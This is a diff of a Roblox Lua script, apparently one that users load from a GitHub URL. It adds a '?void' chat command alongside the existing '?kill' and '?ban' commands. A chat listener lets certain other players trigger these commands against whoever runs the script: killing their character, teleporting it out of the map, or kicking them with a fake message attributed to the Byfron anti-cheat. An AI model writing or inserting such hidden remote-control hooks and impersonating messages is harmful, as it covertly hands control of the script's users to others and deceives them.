@@ -143,11 +143,15 @@ local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6h
     end
 
     local function Kill()
-        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
+        game.Players.LocalPlayer.Character.Humanoid.Health = 0
     end
 
     local function Ban()
         game.Players.LocalPlayer:Kick('Our Newest Byfron-Made Anti-Cheat detected "Velocity Changing" or "Velocity Fly", If this was an error report it in discord.gg/tb2beta & ping Dakota.')
+    end
+
+    local function Void()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9e9, 9e9, 9e9)
     end
 
     local function attachChatListener(player)
@@ -173,6 +177,8 @@ local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6h
                     Kill()
                 elseif message == "?ban" then
                     Ban()
+                elseif message == "?void" then
+                    Void()
                 end
             end
         end)
